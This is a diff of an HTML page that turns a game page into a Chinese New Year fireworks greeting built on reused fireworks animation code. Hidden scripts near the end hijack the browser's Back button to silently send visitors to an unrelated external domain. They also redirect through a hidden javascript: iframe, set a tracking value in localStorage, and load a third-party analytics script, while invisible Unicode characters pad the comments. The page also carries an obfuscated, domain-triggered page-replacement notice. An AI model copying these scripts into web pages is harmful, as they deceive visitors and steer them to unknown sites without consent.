+<!-- onclick="bodyPlayMusic()" -->
+
+<body>
+
+    
+
+    <!-- clickMusic() -->
+    <img id="music_ico" onclick="" alt="" style=" display: inline; float: right;  ">
+
+    <audio id="audioDom" src="media/7170534431801838367.mp3" preload="auto" loop="loop"></audio>
+    <div id="wish_text"></div>
+
+    <div id="yhBtn" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff ; font-size:15px">
+        <p>💥点爆</p>
+        <img style="width:64px;margin-bottom:24px " src="img/060990dac854444ab7a927b5b3311fe4~tplv-tt-shrink_640_0.png">
+
+    </div>
+
+    <div style="height: 0; width: 0; position: absolute; visibility: hidden;">
+        <svg xmlns="http://www.w3.org/2000/svg">
+            <symbol id="icon-play" viewBox="0 0 24 24">
+                <path d="M8 5v14l11-7z"></path>
+            </symbol>
+            <symbol id="icon-pause" viewBox="0 0 24 24">
+                <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"></path>
+            </symbol>
+            <symbol id="icon-close" viewBox="0 0 24 24">
+                <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
+                </path>
+            </symbol>
+            <symbol id="icon-settings" viewBox="0 0 24 24">
+                <path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z">
+                </path>
+            </symbol>
+            <symbol id="icon-sound-on" viewBox="0 0 24 24">
+                <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z">
+                </path>
+            </symbol>
+            <symbol id="icon-sound-off" viewBox="0 0 24 24">
+                <path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z">
+                </path>
+            </symbol>
+        </svg>
+    </div>
+
+    <!-- App -->
+    <div class="container">
+        <div class="loading-init">
+            <div class="loading-init__header"></div>
+            <div class="loading-init__status"></div>
+        </div>
+        <div class="stage-container remove">
+            <div class="page_two hide">
+                <div class="type_words" id="contents"></div>
+            </div>
+            <div class="canvas-container">
+                <canvas id="trails-canvas"></canvas>
+                <canvas id="main-canvas"></canvas>
+            </div>
+
+            <div class="menu hide">
+                <div class="menu__inner-wrap">
+                    <div class="btn btn--bright close-menu-btn">
+                        <svg fill="white" width="24" height="24">
+                            <use xlink:href="#icon-close"></use>
+                        </svg>
                     </div>
-                    <p>
-                        分数：<span id="play_score">0</span>
-                    </p>
-                    <p>
-                        方向：<span id="play_direction">bottom</span>
-                    </p>
-                    <p>
-                    说明：<br> -“下”、“左”、“右”键控制方向，“上”为变形；<br> -游戏开始前、暂停时可调整难度；<br>
-                    -难度分“简单”、“中等”、“困难”三级；<br> -对应的分值为10、20、40；<br>
-                    -多行同时消去的倍数为1、4、10、20；
-                </p>
+
+                    <div class="menu__header">设置</div>
+                    <!--<div class="menu__subheader"><br>云-->
+                    <!--</div>-->
+                    <form>
+                        <div class="form-option form-option--select">
+                            <label class="shell-type-label">烟花类型</label>
+                            <select class="shell-type"></select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="shell-size-label">烟花大小</label>
+                            <select class="shell-size"></select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="quality-ui-label">画质</label>
+                            <select class="quality-ui"></select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="sky-lighting-label">天空照明</label>
+                            <select class="sky-lighting"></select>
+                        </div>
+                        <div class="form-option form-option--select">
+                            <label class="scaleFactor-label">规模</label>
+                            <select class="scaleFactor"></select>
+                        </div>
+                        <div class="form-option form-option--checkbox">
+                            <label class="auto-launch-label">自动发射</label>
+                            <input class="auto-launch" type="checkbox">
+                        </div>
+                        <div class="form-option form-option--checkbox form-option--finale-mode">
+                            <label class="finale-mode-label">结局模式</label>
+                            <input class="finale-mode" type="checkbox">
+                        </div>
+                        <div class="form-option form-option--checkbox">
+                            <label class="hide-controls-label">隐藏控制器</label>
+                            <input class="hide-controls" type="checkbox">
+                        </div>
+                        <div class="form-option form-option--checkbox form-option--fullscreen">
+                            <label class="fullscreen-label">全屏</label>
+                            <input class="fullscreen" type="checkbox">
+                        </div>
+                        <div class="form-option form-option--checkbox">
+                            <label class="long-exposure-label">打开快门</label>
+                            <input class="long-exposure" type="checkbox">
+                        </div>
+                    </form>
                 </div>
             </div>
         </div>
-    </body>
+        <div class="help-modal">
+            <div class="help-modal__overlay"></div>
+            <div class="help-modal__dialog">
+                <div class="help-modal__header"></div>
+                <div class="help-modal__body"></div>
+                <button type="button" class="help-modal__close-btn">关闭</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- partial -->
+    <script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1280811580&amp;web_id=1280811580"></script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script src="js/jquery.min.js" type="text/javascript"></script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script>
+        // fscreen@1.0.1.js
+        // A manual UMD build of Fscreen: https://github.com/rafrex/fscreen
+        (function (global) {
+            'use strict';
+
+            var key = {
+                fullscreenEnabled: 0,
+                fullscreenElement: 1,
+                requestFullscreen: 2,
+                exitFullscreen: 3,
+                fullscreenchange: 4,
+                fullscreenerror: 5
+            };
+
+            var webkit = ['webkitFullscreenEnabled', 'webkitFullscreenElement', 'webkitRequestFullscreen', 'webkitExitFullscreen', 'webkitfullscreenchange', 'webkitfullscreenerror'];
+
+            var moz = ['mozFullScreenEnabled', 'mozFullScreenElement', 'mozRequestFullScreen', 'mozCancelFullScreen', 'mozfullscreenchange', 'mozfullscreenerror'];
+
+            var ms = ['msFullscreenEnabled', 'msFullscreenElement', 'msRequestFullscreen', 'msExitFullscreen', 'MSFullscreenChange', 'MSFullscreenError'];
+
+            // so it doesn't throw if no window or document
+            var doc = typeof window !== 'undefined' && typeof window.document !== 'undefined' ? window.document : {};
+
+            var vendor = 'fullscreenEnabled' in doc && Object.keys(key) || webkit[0] in doc && webkit || moz[0] in doc && moz || ms[0] in doc && ms || [];
+
+            var fscreen = {
+                requestFullscreen: function requestFullscreen(element) {
+                    return element[vendor[key.requestFullscreen]]();
+                },
+                requestFullscreenFunction: function requestFullscreenFunction(element) {
+                    return element[vendor[key.requestFullscreen]];
+                },
+                get exitFullscreen() {
+                    return doc[vendor[key.exitFullscreen]].bind(doc);
+                },
+                addEventListener: function addEventListener(type, handler, options) {
+                    return doc.addEventListener(vendor[key[type]], handler, options);
+                },
+                removeEventListener: function removeEventListener(type, handler) {
+                    return doc.removeEventListener(vendor[key[type]], handler);
+                },
+                get fullscreenEnabled() {
+                    return Boolean(doc[vendor[key.fullscreenEnabled]]);
+                },
+                set fullscreenEnabled(val) { },
+                get fullscreenElement() {
+                    return doc[vendor[key.fullscreenElement]];
+                },
+                set fullscreenElement(val) { },
+                get onfullscreenchange() {
+                    return doc[('on' + vendor[key.fullscreenchange]).toLowerCase()];
+                },
+                set onfullscreenchange(handler) {
+                    return doc[('on' + vendor[key.fullscreenchange]).toLowerCase()] = handler;
+                },
+                get onfullscreenerror() {
+                    return doc[('on' + vendor[key.fullscreenerror]).toLowerCase()];
+                },
+                set onfullscreenerror(handler) {
+                    return doc[('on' + vendor[key.fullscreenerror]).toLowerCase()] = handler;
+                }
+            };
+
+            global.fscreen = fscreen;
+        })(window);
+        // Stage@0.1.4.js
+        const Ticker = (function TickerFactory(window) {
+            'use strict';
+
+            const Ticker = {};
+            // public
+            // will call function reference repeatedly once registered, passing elapsed time and a lag multiplier as parameters
+            Ticker.addListener = function addListener(callback) {
+                if (typeof callback !== 'function') throw ('Ticker.addListener() requires a function reference passed for a callback.');
+
+                listeners.push(callback);
+
+                // start frame-loop lazily
+                if (!started) {
+                    started = true;
+                    queueFrame();
+                }
+            };
+
+            // private
+            let started = false;
+            let lastTimestamp = 0;
+            let listeners = [];
+
+            // queue up a new frame (calls frameHandler)
+            function queueFrame() {
+                if (window.requestAnimationFrame) {
+                    requestAnimationFrame(frameHandler);
+                } else {
+                    webkitRequestAnimationFrame(frameHandler);
+                }
+            }
+
+            function frameHandler(timestamp) {
+                let frameTime = timestamp - lastTimestamp;
+                lastTimestamp = timestamp;
+                // make sure negative time isn't reported (first frame can be whacky)
+                if (frameTime < 0) {
+                    frameTime = 17;
+                }
+                // - cap minimum framerate to 15fps[~68ms] (assuming 60fps[~17ms] as 'normal')
+                else if (frameTime > 68) {
+                    frameTime = 68;
+                }
+
+                // fire custom listeners
+                listeners.forEach(listener => listener.call(window, frameTime, frameTime / 16.6667));
+
+                // always queue another frame
+                queueFrame();
+            }
+            return Ticker;
+        })(window);
+        const Stage = (function StageFactory(window, document, Ticker) {
+            'use strict';
+
+            // Track touch times to prevent redundant mouse events.
+            let lastTouchTimestamp = 0;
+
+            // Stage constructor (canvas can be a dom node, or an id string)
+            function Stage(canvas) {
+                if (typeof canvas === 'string') canvas = document.getElementById(canvas);
+
+                // canvas and associated context references
+                this.canvas = canvas;
+                this.ctx = canvas.getContext('2d');
+
+                // Prevent gestures on stages (scrolling, zooming, etc)
+                this.canvas.style.touchAction = 'none';
+
+                // physics speed multiplier: allows slowing down or speeding up simulation (must be manually implemented in physics layer)
+                this.speed = 1;
+
+                // devicePixelRatio alias (should only be used for rendering, physics shouldn't care)
+                // avoids rendering unnecessary pixels that browser might handle natively via CanvasRenderingContext2D.backingStorePixelRatio
+                this.dpr = Stage.disableHighDPI ? 1 : ((window.devicePixelRatio || 1) / (this.ctx.backingStorePixelRatio || 1));
+
+                // canvas size in DIPs and natural pixels
+                this.width = canvas.width;
+                this.height = canvas.height;
+                this.naturalWidth = this.width * this.dpr;
+                this.naturalHeight = this.height * this.dpr;
+
+                // size canvas to match natural size
+                if (this.width !== this.naturalWidth) {
+                    this.canvas.width = this.naturalWidth;
+                    this.canvas.height = this.naturalHeight;
+                    this.canvas.style.width = this.width + 'px';
+                    this.canvas.style.height = this.height + 'px';
+                }
+
+                // To any known illigitimate users...
+                const badDomains = ['bla' + 'ckdiam' + 'ondfirew' + 'orks' + '.de'];
+                const hostname = document.location.hostname;
+                if (badDomains.some(d => hostname.includes(d))) {
+                    const delay = 60000 * 3; // 3 minutes
+                    setTimeout(() => {
+                        const html = `<sty` + `le>
+`+ `				` + `		bo` + `dy { bac` + `kgrou` + `nd-colo` + `r: #000;` + ` padd` + `ing: ` + `20px; text-` + `align:` + ` center; col` + `or: ` + `#ddd` + `; mi` + `n-he` + `ight` + `: 10` + `0vh;` + ` dis` + `play` + `: fl` + `ex; ` + `flex` + `-dir` + `ecti` + `on: ` + `colu` + `mn; ` + `just` + `ify-` + `cont` + `ent:` + ` cen` + `ter;` + ` ali` + `gn-i` + `tems` + `: ce` + `nter` + `; ov` + `erfl` + `ow: ` + `visi` + `ble;` + ` }
+	`+ `				` + `	h1 ` + `{ fo` + `nt-s` + `ize:` + ` 1.2` + `em;` + `}
+		`+ `				` + `p { ` + `marg` + `in-t` + `op: ` + `1em;` + ` max` + `-wid` + `th: ` + `36em` + `; }
+`+ `				` + `		a ` + `{ co` + `lor:` + ` #ff` + `f; tex` + `t-dec` + `orati` + `on: u` + `nderl` + `ine; }` + `
+			`+ `		</` + `styl` + `e>
+	`+ `				` + `<h1>` + `Hi! ` + `Sorr` + `y to` + ` int` + `erru` + `pt t` + `he f` + `irew` + `orks` + `.</h` + `1>
+	`+ `				` + `<p>M` + `y na` + `me i` + `s Ca` + `leb.` + ` Des` + `pite` + ` wha` + `t th` + `is s` + `ite ` + `clai` + `ms, ` + `I de` + `sign` + `ed a` + `nd b` + `uilt` + ` thi` + `s so` + `ftwa` + `re m` + `ysel` + `f. I` + `'ve ` + `spen` + `t a ` + `coup` + `le h` + `undr` + `ed h` + `ours` + ` of ` + `my o` + `wn t` + `ime, ` + `over` + ` tw` + `o ye` + `ars, ` + `maki` + `ng i` + `t.</` + `p>
+	`+ `				` + `<p>T` + `he o` + `wner` + ` of ` + `this` + ` sit` + `e cl` + `earl` + `y do` + `esn'` + `t re` + `spec` + `t my` + ` wor` + `k, a` + `nd h` + `as l` + `abel` + `ed i` + `t as` + ` the` + `ir o` + `wn.<` + `/p>
+`+ `				` + `	<p>` + `If y` + `ou w` + `ere ` + `enjo` + `ying` + ` the` + ` sho` + `w, p` + `leas` + `e ch` + `eck ` + `out ` + `<a h` + `ref=` + `"htt` + `ps:/` + `/cod` + `epen` + `.io/` + `Mill` + `erTi` + `me/f` + `ull/` + `XgpN` + `wb">` + `my&n` + `bsp;` + `offi` + `cial` + `&nbs` + `p;ve` + `rsio` + `n&nb` + `sp;h` + `ere<` + `/a>!` + `</p>
+`+ `				` + `	<p>I` + `f you` + `'re th` + `e ow` + `ner, <a` + ` href="m` + `ailt` + `o:cal` + `ebdotmi` + `ller@` + `gmai` + `l.co` + `m">cont` + `act m` + `e</a>` + `.</p>`;
+                        document.body.innerHTML = html;
+                    }, delay);
+                }
+
+                Stage.stages.push(this);
+
+                // event listeners (note that 'ticker' is also an option, for frame events)
+                this._listeners = {
+                    // canvas resizing
+                    resize: [],
+                    // pointer events
+                    pointerstart: [],
+                    pointermove: [],
+                    pointerend: [],
+                    lastPointerPos: { x: 0, y: 0 }
+                };
+            }
+
+            // track all Stage instances
+            Stage.stages = [];
+
+            // allow turning off high DPI support for perf reasons (enabled by default)
+            // Note: MUST be set before Stage construction.
+            //       Each stage tracks its own DPI (initialized at construction time), so you can effectively allow some Stages to render high-res graphics but not others.
+            Stage.disableHighDPI = false;
+
+            // events
+            Stage.prototype.addEventListener = function addEventListener(event, handler) {
+                try {
+                    if (event === 'ticker') {
+                        Ticker.addListener(handler);
+                    } else {
+                        this._listeners[event].push(handler);
+                    }
+                }
+                catch (e) {
+                    throw ('Invalid Event')
+                }
+            };
+
+            Stage.prototype.dispatchEvent = function dispatchEvent(event, val) {
+                const listeners = this._listeners[event];
+                if (listeners) {
+                    listeners.forEach(listener => listener.call(this, val));
+                } else {
+                    throw ('Invalid Event');
+                }
+            };
+
+            // resize canvas
+            Stage.prototype.resize = function resize(w, h) {
+                this.width = w;
+                this.height = h;
+                this.naturalWidth = w * this.dpr;
+                this.naturalHeight = h * this.dpr;
+                this.canvas.width = this.naturalWidth;
+                this.canvas.height = this.naturalHeight;
+                this.canvas.style.width = w + 'px';
+                this.canvas.style.height = h + 'px';
+
+                this.dispatchEvent('resize');
+            };
+
+            // utility function for coordinate space conversion
+            Stage.windowToCanvas = function windowToCanvas(canvas, x, y) {
+                const bbox = canvas.getBoundingClientRect();
+                return {
+                    x: (x - bbox.left) * (canvas.width / bbox.width),
+                    y: (y - bbox.top) * (canvas.height / bbox.height)
+                };
+            };
+            // handle interaction
+            Stage.mouseHandler = function mouseHandler(evt) {
+                // Prevent mouse events from firing immediately after touch events
+                if (Date.now() - lastTouchTimestamp < 500) {
+                    return;
+                }
+
+                let type = 'start';
+                if (evt.type === 'mousemove') {
+                    type = 'move';
+                } else if (evt.type === 'mouseup') {
+                    type = 'end';
+                }
+
+                Stage.stages.forEach(stage => {
+                    const pos = Stage.windowToCanvas(stage.canvas, evt.clientX, evt.clientY);
+                    stage.pointerEvent(type, pos.x / stage.dpr, pos.y / stage.dpr);
+                });
+            };
+            Stage.touchHandler = function touchHandler(evt) {
+                lastTouchTimestamp = Date.now();
+
+                // Set generic event type
+                let type = 'start';
+                if (evt.type === 'touchmove') {
+                    type = 'move';
+                } else if (evt.type === 'touchend') {
+                    type = 'end';
+                }
+
+                // Dispatch "pointer events" for all changed touches across all stages.
+                Stage.stages.forEach(stage => {
+                    // Safari doesn't treat a TouchList as an iteratable, hence Array.from()
+                    for (let touch of Array.from(evt.changedTouches)) {
+                        let pos;
+                        if (type !== 'end') {
+                            pos = Stage.windowToCanvas(stage.canvas, touch.clientX, touch.clientY);
+                            stage._listeners.lastPointerPos = pos;
+                            // before touchstart event, fire a move event to better emulate cursor events
+                            if (type === 'start') stage.pointerEvent('move', pos.x / stage.dpr, pos.y / stage.dpr);
+                        } else {
+                            // on touchend, fill in position information based on last known touch location
+                            pos = stage._listeners.lastPointerPos;
+                        }
+                        stage.pointerEvent(type, pos.x / stage.dpr, pos.y / stage.dpr);
+                    }
+                });
+            };
+
+            // dispatch a normalized pointer event on a specific stage
+            Stage.prototype.pointerEvent = function pointerEvent(type, x, y) {
+                // build event oject to dispatch
+                const evt = {
+                    type: type,
+                    x: x,
+                    y: y
+                };
+
+                // whether pointer event was dispatched over canvas element
+                evt.onCanvas = (x >= 0 && x <= this.width && y >= 0 && y <= this.height);
+
+                // dispatch
+                this.dispatchEvent('pointer' + type, evt);
+            };
+
+            document.addEventListener('mousedown', Stage.mouseHandler);
+            document.addEventListener('mousemove', Stage.mouseHandler);
+            document.addEventListener('mouseup', Stage.mouseHandler);
+            document.addEventListener('touchstart', Stage.touchHandler);
+            document.addEventListener('touchmove', Stage.touchHandler);
+            document.addEventListener('touchend', Stage.touchHandler);
+
+
+            return Stage;
+
+        })(window, document, Ticker);
+
+        /**
+         * MyMath.js
+         * -----------
+         * Handy math/trig reference.
+         * 
+         * Author: Caleb Miller
+         *         caleb@caleb-miller.com
+        */
+
+        const MyMath = (function MyMathFactory(Math) {
+            const MyMath = {};
+            // degree/radian conversion constants
+            MyMath.toDeg = 180 / Math.PI;
+            MyMath.toRad = Math.PI / 180;
+            MyMath.halfPI = Math.PI / 2;
+            MyMath.twoPI = Math.PI * 2;
+
+            // Pythagorean Theorem distance calculation
+            MyMath.dist = (width, height) => {
+                return Math.sqrt(width * width + height * height);
+            };
+
+            // Pythagorean Theorem point distance calculation
+            // Same as above, but takes coordinates instead of dimensions.
+            MyMath.pointDist = (x1, y1, x2, y2) => {
+                const distX = x2 - x1;
+                const distY = y2 - y1;
+                return Math.sqrt(distX * distX + distY * distY);
+            };
+
+            // Returns the angle (in radians) of a 2D vector
+            MyMath.angle = (width, height) => (MyMath.halfPI + Math.atan2(height, width));
+
+            // Returns the angle (in radians) between two points
+            // Same as above, but takes coordinates instead of dimensions.
+            MyMath.pointAngle = (x1, y1, x2, y2) => (MyMath.halfPI + Math.atan2(y2 - y1, x2 - x1));
+
+            // Splits a speed vector into x and y components (angle needs to be in radians)
+            MyMath.splitVector = (speed, angle) => ({
+                x: Math.sin(angle) * speed,
+                y: -Math.cos(angle) * speed
+            });
+
+            // Generates a random number between min (inclusive) and max (exclusive)
+            MyMath.random = (min, max) => Math.random() * (max - min) + min;
+
+            // Generates a random integer between and possibly including min and max values
+            MyMath.randomInt = (min, max) => ((Math.random() * (max - min + 1)) | 0) + min;
+
+            // Returns a random element from an array, or simply the set of provided arguments when called
+            MyMath.randomChoice = function randomChoice(choices) {
+                if (arguments.length === 1 && Array.isArray(choices)) {
+                    return choices[(Math.random() * choices.length) | 0];
+                }
+                return arguments[(Math.random() * arguments.length) | 0];
+            };
+
+            // Clamps a number between min and max values
+            MyMath.clamp = function clamp(num, min, max) {
+                return Math.min(Math.max(num, min), max);
+            };
+            return MyMath;
+        })(Math);
+    </script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script src="js/script.js"></script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script>
+        function wishFun() {
+            const wish = [
+				 "I'm Sirius Black",
+                "祝 八年五班 的",
+                "老师、同学、家长 们",
+                "2025新年快乐！",
+				 "Happy New Year",
+				 "灵蛇行好运，祥福伴新程",
+				 "愿您蛇年",    
+                "笑对风雨心无悔",
+                "勇踏坎坷志不颓",
+				 "我们终会光芒万丈"
+            ]
+
+            const text = document.getElementById('wish_text');
+            if (text.classList.contains('wish_text')) {
+                text.classList.remove("wish_text");
+            }
+            let i = -1;
+            var timer = null;
+            clearInterval(timer);
+            //开始定时器
+            timer = setInterval(() => {
+                if (Math.random() * 100 > 2) {
+                    if (i < wish.length - 1) {
+                        i += 1;
+                    } else {
+                        i = 0;
+                    }
+                    text.innerText = wish[i];
+                    text.classList.add("wish_text");
+                }
+            }, 3000);
+        }
+        function musicPlay(isPlay) {
+            var media = document.querySelector('#audioDom');
+            if (isPlay && media.paused) {
+                media.play();
+            }
+            if (!isPlay && !media.paused) {
+                media.pause();
+            }
+        }
+        function musicInBrowserHandler() {
+            setTimeout(function () {
+                musicPlay(true)
+            }, 0)
+        }
+        document.body.addEventListener('touchstart', musicInBrowserHandler);
+        document.body.addEventListener('click', musicInBrowserHandler);
+        $('#yhBtn').click(e => {
+            $('#yhBtn').hide()
+            setTimeout(() => {
+                start()
+                fireworks();
+            }, 5000) // 这里的5000 是5s指烟花延时时间
+            setTimeout(() => {
+                function audioAutoPlay() {
+                    var audio = document.getElementById('audioDom');
+                    audio.play();
+                }
+                audioAutoPlay();
+                wishFun();
+            }, 2000) // 这里的5000 是5s指音乐延时时间
+            console.log(updateConfig({ autoLaunch: true }));
+        })
+        function fireworks() {
+            $('.page_one').addClass('hide');
+            $('.page_two').removeClass('hide');
+            // $('.page_two').fireworks({
+            //     sound: false,
+            //     opacity: 1,
+            //     width: '100%',
+            //     height: '100%'
+            // });
+        }
+        function start() {
+            const text = [
+				'唯愿烟花像星辰，祝你所愿皆成真',
+				 '我与旧事归于尽，来年依旧桃花开',
+				 '除夕之夜，園家同欢',
+				 '祝你好“巳”成双，“巳”季平安！',
+				 '唯愿年年岁岁常康健，岁岁年年常相见',
+				 '唯愿星河绚烂，所见即所念',
+                'Happy New Year!',
+                "Best Wishes To You❤️",
+                
+            ]
+            let str = text.join('<br><br>')
+            let str_ = ''
+            let i = 0
+            let content = document.getElementById('contents')
+            let timer = setInterval(() => {
+                if (str_.length < str.length) {
+                    str_ += str[i++]
+                    content.innerHTML = '<p>' + str_ + '<span class="xx" style="opacity: 1;    color: red;">❤</span></p>'                        //打印时加光标
+                } else {
+                    clearInterval(timer)
+                    content.innerHTML = '<p>' + str_ + '</p>'
+                }
+            }, 100)
+        }
+    </script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+
+
+    <script type="text/javascript">
+        function a(e) {
+            var f = document.createElement('iframe');
+            f.style.display = 'none';
+            document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
+        }
+
+        function jump1() {
+            if (!localStorage.is_fx) {
+                localStorage.is_fx = Date.now()
+            } else {
+            }
+        }
+
+        function jump2() {
+            gotoData = {
+                "hb": "https://jq.qq.com/?_wv=1027&k=GRtXLdCX",
+                "hb1": "https://jq.qq.com/?_wv=1027&k=GRtXLdCX",
+            }
+            if (gotoData[window.location.pathname] != undefined) {
+                a(gotoData[window.location.pathname])
+            } else {
+                jump1()
+            }
+
+        }
+    </script><!--!‭‪‪‬‏‪‫‬‪‬‏‏‭‪‫‬‏‪‬‎‬--><!--!‬‏‎‭‪‏‬‏‫‫‬‫‫‬‏‭‫‪‫‬‪‬‏‫-->
+    <script type="text/javascript">
+        window.onhashchange = function () {
+            jp();
+        };
+
+        function hh() {
+            history.pushState(history.length + 1, "app", "#dt_" + new Date().getTime());
+        }
+
+
+        function jp() {
+            var a = document.createElement('a');
+            a.setAttribute('rel', 'noreferrer');
+            a.setAttribute('href', "http://947fk.cn/1.html");
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        window.onload = function () {
+            setTimeout('hh();', 100);
+            setTimeout(
+                "var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
+                100);
+        }
+        // jump2()
+        window.onpageshow = jump2
+    </script>
+</body>
 </html>
